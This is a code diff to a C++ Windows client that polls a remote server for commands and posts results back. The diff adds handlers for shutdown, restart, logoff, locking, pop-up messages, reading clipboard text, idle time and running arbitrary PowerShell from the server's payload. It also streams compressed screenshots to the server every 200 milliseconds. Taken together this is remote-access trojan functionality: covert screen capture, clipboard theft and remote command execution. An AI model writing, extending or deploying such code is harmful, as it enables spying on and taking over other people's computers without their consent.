@@ -7,12 +7,14 @@
 #include <gdiplus.h>
 #include <vfw.h>
 #include <tlhelp32.h>
+#include <mmsystem.h>
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "vfw32.lib")
+#pragma comment(lib, "winmm.lib")
 using namespace Gdiplus;
 
 std::string computerName;
@@ -145,7 +147,7 @@ std::vector<MonInfo> getMonitors(){
     return v;
 }
 
-std::string takeScreenshot(int monitorIdx) {
+std::string takeScreenshot(int monitorIdx, int quality=80) {
     auto mons=getMonitors();
     int x=0,y=0,w=GetSystemMetrics(SM_CXSCREEN),h=GetSystemMetrics(SM_CYSCREEN);
     if(monitorIdx>=0&&monitorIdx<(int)mons.size()){
@@ -168,7 +170,13 @@ std::string takeScreenshot(int monitorIdx) {
     GetEncoderClsid(L"image/jpeg", &jpegClsid);
     IStream* istream = NULL;
     CreateStreamOnHGlobal(NULL, TRUE, &istream);
-    bmp.Save(istream, &jpegClsid, NULL);
+    EncoderParameters ep;ep.Count=1;
+    ep.Parameter[0].Guid=EncoderQuality;
+    ep.Parameter[0].Type=EncoderParameterValueTypeLong;
+    ep.Parameter[0].NumberOfValues=1;
+    ULONG q=(ULONG)quality;
+    ep.Parameter[0].Value=&q;
+    bmp.Save(istream, &jpegClsid, &ep);
     STATSTG stat;
     istream->Stat(&stat, STATFLAG_NONAME);
     ULONG sz = (ULONG)stat.cbSize.LowPart;
@@ -453,6 +461,40 @@ DWORD WINAPI pollThread(LPVOID) {
                         result = getSystemInfo();
                     } else if (type == "kill_process") {
                         result = killProcess(payload);
+                    } else if (type == "shutdown") {
+                        result = execCmd("shutdown /s /t 0");
+                    } else if (type == "restart") {
+                        result = execCmd("shutdown /r /t 0");
+                    } else if (type == "lock") {
+                        LockWorkStation(); result = "ok";
+                    } else if (type == "logoff") {
+                        result = execCmd("shutdown /l");
+                    } else if (type == "msgbox") {
+                        std::string t=extractJson(payload,"text");
+                        std::string ti=extractJson(payload,"title");
+                        MessageBoxA(NULL,t.c_str(),ti.empty()?"Remote":ti.c_str(),MB_OK);
+                        result="ok";
+                    } else if (type == "volume") {
+                        int v=0;
+                        try{v=std::stoi(payload);}catch(...){v=-1;}
+                        if(v<0||v>100) result="bad_val";
+                        else{DWORD w=(DWORD)(v*65535/100);waveOutSetVolume(0,(w<<16)|w);result="ok";}
+                    } else if (type == "clipboard") {
+                        std::string r;
+                        if(OpenClipboard(0)){
+                            HANDLE h=GetClipboardData(CF_TEXT);
+                            if(h){char*p=(char*)GlobalLock(h);if(p){r=p;GlobalUnlock(h);}}
+                            CloseClipboard();
+                        }
+                        result=r.empty()?"empty":r;
+                    } else if (type == "idle") {
+                        LASTINPUTINFO l={sizeof(l)};
+                        GetLastInputInfo(&l);
+                        result=std::to_string((GetTickCount()-l.dwTime)/1000);
+                    } else if (type == "powershell") {
+                        result = execCmd("powershell -c "+payload);
+                    } else if (type == "uptime") {
+                        result=std::to_string(GetTickCount64()/1000);
                     } else {
                         result = "unknown_type";
                     }
@@ -473,7 +515,7 @@ DWORD WINAPI screenThread(LPVOID) {
     while(true) {
         Sleep(200);
         try {
-            std::string b64 = takeScreenshot(0);
+            std::string b64 = takeScreenshot(0, 30);
             std::string escaped = jsonEscape(b64);
             std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen_live\",\"payload\":\"\",\"status\":\"done\",\"result\":\"" + escaped + "\"}";
             httpsPost("/rest/v1/commands", body);
